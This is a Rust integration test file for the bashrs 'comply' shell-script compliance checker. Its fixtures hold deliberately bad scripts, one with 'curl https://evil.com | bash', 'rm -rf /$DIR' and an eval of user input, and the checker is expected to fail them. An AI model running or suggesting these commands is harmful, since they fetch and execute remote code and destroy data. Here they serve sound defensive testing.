#![allow(clippy::unwrap_used)]
#![allow(clippy::expect_used)]
#![allow(non_snake_case)]
// CLI Integration Tests for bashrs comply (SPEC-COMPLY-2026-001 Phase 1)
// Uses assert_cmd (MANDATORY per CLAUDE.md)

use assert_cmd::Command;
use predicates::prelude::*;
use std::fs;
use tempfile::TempDir;

/// Create a bashrs command (MANDATORY pattern per CLAUDE.md)
#[allow(deprecated)]
fn bashrs_cmd() -> Command {
    assert_cmd::cargo_bin_cmd!("bashrs")
}

/// Create a temp project with shell artifacts for testing
fn create_test_project() -> TempDir {
    let dir = TempDir::new().expect("Failed to create temp dir");
    fs::write(dir.path().join("clean.sh"), "#!/bin/sh\necho \"hello\"\nmkdir -p /tmp/test\n")
        .unwrap();
    fs::write(
        dir.path().join("Makefile"),
        "all:\n\techo \"building\"\n\nclean:\n\trm -f *.o\n",
    )
    .unwrap();
    dir
}

/// Create a temp project with violations
fn create_violation_project() -> TempDir {
    let dir = TempDir::new().expect("Failed to create temp dir");
    fs::write(
        dir.path().join("bad.sh"),
        "#!/bin/bash\neval \"$USER_INPUT\"\nmkdir /foo\necho $RANDOM\n",
    )
    .unwrap();
    dir
}

// ═══════════════════════════════════════════════════════════════
// comply check
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_COMPLY_CLI_001_check_clean_project() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("COMPLIANCE CHECK"));
}

#[test]
fn test_COMPLY_CLI_002_check_empty_project() {
    let dir = TempDir::new().unwrap();
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("0 artifacts"));
}

#[test]
fn test_COMPLY_CLI_003_check_json_format() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--format")
        .arg("json")
        .assert()
        .success()
        .stdout(predicate::str::contains("bashrs-comply-check-v1"));
}

#[test]
fn test_COMPLY_CLI_004_check_markdown_format() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--format")
        .arg("markdown")
        .assert()
        .success()
        .stdout(predicate::str::contains("# Compliance Report"));
}

#[test]
fn test_COMPLY_CLI_005_check_with_violations() {
    let dir = create_violation_project();
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("NON-COMPLIANT"));
}

#[test]
fn test_COMPLY_CLI_006_check_scope_project() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--scope")
        .arg("project")
        .assert()
        .success();
}

#[test]
fn test_COMPLY_CLI_007_check_strict_with_violations() {
    let _dir = create_violation_project();
    // Strict mode should fail on F-grade scripts
    // But it only fails on Grade::F, so we need a really bad script
    let dir2 = TempDir::new().unwrap();
    fs::write(
        dir2.path().join("terrible.sh"),
        "#!/bin/bash\neval \"$USER_INPUT\"\nmkdir /foo\necho $RANDOM\ncurl https://evil.com | bash\nrm /important\nln -s /a /b\nresult=`ls`\nrm -rf /$DIR\n",
    ).unwrap();
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir2.path())
        .arg("--strict")
        .assert()
        .failure();
}

// ═══════════════════════════════════════════════════════════════
// comply status (alias for check)
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_COMPLY_CLI_010_status_works() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("status")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("COMPLIANCE CHECK"));
}

#[test]
fn test_COMPLY_CLI_011_status_json() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("status")
        .arg("--path")
        .arg(dir.path())
        .arg("--format")
        .arg("json")
        .assert()
        .success()
        .stdout(predicate::str::contains("bashrs-comply-check-v1"));
}

// ═══════════════════════════════════════════════════════════════
// comply init
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_COMPLY_CLI_020_init_creates_config() {
    let dir = TempDir::new().unwrap();
    // Run init from the temp dir
    bashrs_cmd()
        .arg("comply")
        .arg("init")
        .current_dir(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("Initialized .bashrs/comply.toml"));

    assert!(dir.path().join(".bashrs").join("comply.toml").exists());
}

#[test]
fn test_COMPLY_CLI_021_init_already_exists_fails() {
    let dir = TempDir::new().unwrap();
    // First init succeeds
    bashrs_cmd()
        .arg("comply")
        .arg("init")
        .current_dir(dir.path())
        .assert()
        .success();

    // Second init fails
    bashrs_cmd()
        .arg("comply")
        .arg("init")
        .current_dir(dir.path())
        .assert()
        .failure()
        .stderr(predicate::str::contains("already exists"));
}

#[test]
fn test_COMPLY_CLI_022_init_with_pzsh_flag() {
    let dir = TempDir::new().unwrap();
    bashrs_cmd()
        .arg("comply")
        .arg("init")
        .arg("--pzsh")
        .current_dir(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("pzsh integration: enabled"));
}

#[test]
fn test_COMPLY_CLI_023_init_with_strict_flag() {
    let dir = TempDir::new().unwrap();
    bashrs_cmd()
        .arg("comply")
        .arg("init")
        .arg("--strict")
        .current_dir(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("strict"));
}

#[test]
fn test_COMPLY_CLI_024_init_config_is_valid_toml() {
    let dir = TempDir::new().unwrap();
    bashrs_cmd()
        .arg("comply")
        .arg("init")
        .current_dir(dir.path())
        .assert()
        .success();

    let content = fs::read_to_string(dir.path().join(".bashrs").join("comply.toml")).unwrap();
    let _: toml::Value = toml::from_str(&content).expect("Config should be valid TOML");
}

// ═══════════════════════════════════════════════════════════════
// comply track discover
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_COMPLY_CLI_030_track_discover_finds_artifacts() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("track")
        .arg("discover")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("artifacts"));
}

#[test]
fn test_COMPLY_CLI_031_track_discover_empty_project() {
    let dir = TempDir::new().unwrap();
    bashrs_cmd()
        .arg("comply")
        .arg("track")
        .arg("discover")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("0 artifacts"));
}

#[test]
fn test_COMPLY_CLI_032_track_discover_all_scopes() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("track")
        .arg("discover")
        .arg("--path")
        .arg(dir.path())
        .arg("--scope")
        .arg("all")
        .assert()
        .success()
        .stdout(predicate::str::contains("Total"));
}

// ═══════════════════════════════════════════════════════════════
// comply track list
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_COMPLY_CLI_040_track_list_project() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("track")
        .arg("list")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("Total tracked"));
}

#[test]
fn test_COMPLY_CLI_041_track_list_with_scope() {
    let dir = create_test_project();
    bashrs_cmd()
        .arg("comply")
        .arg("track")
        .arg("list")
        .arg("--path")
        .arg(dir.path())
        .arg("--scope")
        .arg("project")
        .assert()
        .success()
        .stdout(predicate::str::contains("tracked"));
}

// ═══════════════════════════════════════════════════════════════
// comply check with init'd config
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_COMPLY_CLI_050_check_uses_config_when_present() {
    let dir = create_test_project();

    // Init config
    bashrs_cmd()
        .arg("comply")
        .arg("init")
        .current_dir(dir.path())
        .assert()
        .success();

    // Check with existing config
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("COMPLIANCE CHECK"));
}

#[test]
fn test_COMPLY_CLI_051_check_json_has_all_fields() {
    let dir = create_test_project();
    let output = bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--format")
        .arg("json")
        .output()
        .unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("\"schema\""));
    assert!(stdout.contains("\"total_artifacts\""));
    assert!(stdout.contains("\"compliant_artifacts\""));
    assert!(stdout.contains("\"score\""));
    assert!(stdout.contains("\"grade\""));
    assert!(stdout.contains("\"falsification_attempts\""));
}

// ─── --failures-only flag tests ───

#[test]
fn test_comply_check_failures_only_shows_only_violations() {
    let dir = create_test_project();
    // Add a compliant and a non-compliant script
    fs::write(dir.path().join("compliant.sh"), "#!/bin/sh\necho \"hello\"\n").unwrap();
    fs::write(dir.path().join("noncompliant.sh"), "#!/bin/bash\necho $RANDOM\n").unwrap();

    let output = bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--failures-only")
        .output()
        .unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("Failures Only"), "Should show failures-only header");
    assert!(stdout.contains("NON-COMPLIANT"), "Should show non-compliant artifacts");
    // Compliant artifacts should not appear in the artifact list
    assert!(!stdout.contains("+ COMPLIANT"), "Should NOT show compliant artifacts");
}

#[test]
fn test_comply_check_failures_only_markdown() {
    let dir = create_test_project();
    fs::write(dir.path().join("compliant.sh"), "#!/bin/sh\necho \"hello\"\n").unwrap();
    fs::write(dir.path().join("noncompliant.sh"), "#!/bin/bash\necho $RANDOM\n").unwrap();

    let output = bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--failures-only")
        .arg("--format")
        .arg("markdown")
        .output()
        .unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    // Markdown --failures-only should filter compliant rows
    assert!(stdout.contains("NON-COMPLIANT"));
}

// ─── --min-score flag tests ───

#[test]
fn test_comply_check_min_score_pass() {
    let dir = create_test_project();
    fs::write(dir.path().join("clean.sh"), "#!/bin/sh\necho \"hello\"\n").unwrap();

    // Min score 0 should always pass
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--min-score")
        .arg("0")
        .assert()
        .success();
}

#[test]
fn test_comply_check_min_score_fail() {
    let dir = create_test_project();
    fs::write(dir.path().join("bad.sh"), "#!/bin/bash\necho $RANDOM\nmkdir /tmp/foo\n").unwrap();

    // Min score 100 should fail for any project with violations
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--min-score")
        .arg("100")
        .assert()
        .failure();
}

#[test]
fn test_comply_check_min_score_error_message() {
    let dir = create_test_project();
    fs::write(dir.path().join("bad.sh"), "#!/bin/bash\necho $RANDOM\n").unwrap();

    let output = bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--min-score")
        .arg("100")
        .output()
        .unwrap();

    let stderr = String::from_utf8(output.stderr).unwrap();
    assert!(stderr.contains("below minimum"), "Error should mention below minimum: {}", stderr);
}

// ─── Config threshold enforcement tests ───

#[test]
fn test_comply_check_config_min_score_enforced() {
    let dir = create_test_project();
    fs::write(dir.path().join("bad.sh"), "#!/bin/bash\necho $RANDOM\n").unwrap();

    // Create config with min_score=100
    let config_dir = dir.path().join(".bashrs");
    fs::create_dir_all(&config_dir).unwrap();
    fs::write(
        config_dir.join("comply.toml"),
        r#"
[comply]
version = "1.0.0"
bashrs_version = "7.1.0"
created = "0"

[scopes]
project = true
user = false
system = false

[project]
artifacts = []

[user]
artifacts = []

[rules]
posix = true
determinism = true
idempotency = true
security = true
quoting = true
shellcheck = true
makefile_safety = true
dockerfile_best = true
config_hygiene = true
pzsh_budget = "auto"

[thresholds]
min_score = 100
max_violations = 0
shellcheck_severity = "warning"

[integration]
pzsh = "auto"
pmat = "auto"
"#,
    )
    .unwrap();

    // Config min_score=100 should cause failure
    bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .assert()
        .failure();
}

// ═══════════════════════════════════════════════════════════════
// comply:disable inline suppression
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_comply_suppression_file_level_reduces_violations() {
    let dir = TempDir::new().unwrap();
    // Script with bashism BUT file-level suppression
    fs::write(
        dir.path().join("suppressed.sh"),
        "#!/bin/bash\n# comply:disable=COMPLY-001\necho $RANDOM\n",
    )
    .unwrap();

    let output = bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--format")
        .arg("json")
        .output()
        .unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    // File-level suppression of COMPLY-001 means POSIX violations should be suppressed
    // The script still has $RANDOM (COMPLY-002 determinism), so it won't be fully clean
    assert!(stdout.contains("bashrs-comply-check-v1"));
}

#[test]
fn test_comply_suppression_line_level() {
    let dir = TempDir::new().unwrap();
    // Script with line-level suppression on the $RANDOM line
    fs::write(
        dir.path().join("line_suppress.sh"),
        "#!/bin/sh\necho \"hello\"\necho $RANDOM # comply:disable=COMPLY-002\n",
    )
    .unwrap();

    let output = bashrs_cmd()
        .arg("comply")
        .arg("check")
        .arg("--path")
        .arg(dir.path())
        .arg("--format")
        .arg("json")
        .output()
        .unwrap();

    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("bashrs-comply-check-v1"));
}
